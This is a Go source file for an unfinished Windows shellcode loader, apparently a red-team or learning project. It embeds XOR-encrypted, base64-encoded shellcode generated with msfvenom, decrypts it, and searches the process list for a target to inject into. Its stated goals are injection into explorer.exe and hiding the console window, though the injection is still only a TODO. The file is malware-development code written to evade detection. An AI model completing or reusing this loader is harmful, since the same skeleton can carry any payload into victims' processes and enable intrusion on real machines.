package main

import (
	_ "embed"
	b64 "encoding/base64"
	"errors"
	"fmt"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"

	win32 "golang.org/x/sys/windows"
)

//go:embed shellcode/sc.xor.42.b64
//msfvenom -p windows/x64/exec CMD='cmd.exe /c calc.exe' -f raw
// XOR Encrypted with '42'
var enc_sc_b64 string 

type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

func checkError(err error){
	if err != nil {
		log.Fatalln("[!] ERR:" ,err)
	}
}

// https://kylewbanks.com/blog/xor-encryption-using-go
// xor runs a XOR encryption on the input string, encrypting it if it hasn't already been,
// and decrypting it if it has, using the key provided.
func xor(input, key string) (output []byte) {
	for i := 0; i < len(input); i++ {
			output = append(output, input[i] ^ key[i % len(key)])
	}

	return output
}

func decrypt_xor_shellcode(key string, encrypted_sc_b64 string)(output []byte){ 
	//Decode from b64 string
	enc_sc, _ := b64.StdEncoding.DecodeString(encrypted_sc_b64)
	//XOR with key
	output = xor(string(enc_sc), key)
	
	return output
	 
}

func newWindowsProcess(e *win32.ProcessEntry32) WindowsProcess {
    // Find when the string ends for decoding
    end := 0
    for {
        if e.ExeFile[end] == 0 {
            break
        }
        end++
    }

    return WindowsProcess{
        ProcessID:       int(e.ProcessID),
        ParentProcessID: int(e.ParentProcessID),
        Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
    }
}


func processes(procname string)([]WindowsProcess, error){

	
	var TH32CS_SNAPPROCESS uint32 = 0x00000002
	var pe32 win32.ProcessEntry32
		
	//Get handle to snapshot of Windows Process List
	hProcSnap, err := win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

	checkError(err)
	
	//Defer the handle close
	defer win32.CloseHandle(hProcSnap)

	pe32.Size = uint32(unsafe.Sizeof(pe32))

	// Get the first process 
	if err := win32.Process32First(hProcSnap, &pe32); err != nil {
		return nil, err
	}
	
	results := make([]WindowsProcess, 0, 50)

	for {
		results = append(results, newWindowsProcess(&pe32))
		
		err := win32.Process32Next(hProcSnap, &pe32)
        
		if err != nil {
            // windows sends ERROR_NO_MORE_FILES on last process
            if err == syscall.ERROR_NO_MORE_FILES {
				return results, nil
            }
            
			return nil, err
        }
	}
	
}

func FindTarget(procname string)(pid int, err error){
	procs, err := processes(procname)

	checkError(err)

	for _, p := range procs {
		if strings.ToLower(p.Exe) == strings.ToLower(procname){
			return p.ProcessID, nil 
		}
	}

	return 0, errors.New("[!] ERR: Process not found!") 
	
}


func main() {
	// objectives:
	// [x] embed encrypted shellcode from file into program
	// [x] decrypt shellcode (XOR)
	// [ ] inject shellcode into explorer.exe
	// [ ] get rid of console window (pop up)
	
	
	//key := "42"
	//sc := decrypt_xor_shellcode(key, enc_sc_b64)
	pid, err := FindTarget("notepad.exe")

	// Process is not found or other error
	if err != nil { 
		os.Exit(42)
	}


	//TODO: 
	// Inject Shellcode into explorer.exe
	// 	1. OpenProcess
	// 	2. Implement Inject()
	// 	3. CloseHandle 
	// Get rid of console window 
	fmt.Println(pid)


}
